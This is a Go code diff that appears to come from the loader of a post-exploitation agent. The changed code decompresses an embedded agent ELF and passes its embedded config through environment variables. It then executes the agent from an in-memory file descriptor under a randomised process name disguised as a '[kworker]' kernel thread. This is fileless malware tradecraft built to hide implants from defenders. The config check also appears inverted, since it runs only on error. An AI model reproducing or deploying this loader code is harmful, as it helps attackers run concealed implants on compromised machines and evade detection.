@@ -39,15 +39,11 @@ func main() {
 	var decompressedBytes []byte
 	gz := &archiver.Gz{CompressionLevel: 9}
 	r := bytes.NewReader(elfdata)
-	w := bytes.NewBuffer(decompressedBytes)
-	err = gz.Decompress(r, w)
+	extracted_agent_elf := bytes.NewBuffer(decompressedBytes)
+	err = gz.Decompress(r, extracted_agent_elf)
 	if err != nil {
 		log.Fatalf("Decompress ELF: %v", err)
 	}
-
-	// run from memfd
-	procName := fmt.Sprintf("[kworker/%d:%s]", util.RandInt(5, 12), util.RandStr(7))
-	util.MemfdExec(procName, w.Bytes())
 
 	// write self to memfd
 	self_elf_data, err := ioutil.ReadFile(os.Args[0])
@@ -58,4 +54,16 @@ func main() {
 	if fd < 0 {
 		log.Print("MemFDWrite failed")
 	}
+	os.Setenv("FD", fmt.Sprintf("%d", fd))
+
+	// extract config JSON
+	// set env so that agent can read config from it
+	config_data, err := util.DigEmbeddedData(extracted_agent_elf.Bytes())
+	if err != nil {
+		os.Setenv("MOTD", fmt.Sprintf("%s", config_data))
+	}
+
+	// run from memfd
+	procName := fmt.Sprintf("[kworker/%d:%s]", util.RandInt(5, 12), util.RandStr(7))
+	util.MemfdExec(procName, extracted_agent_elf.Bytes())
 }
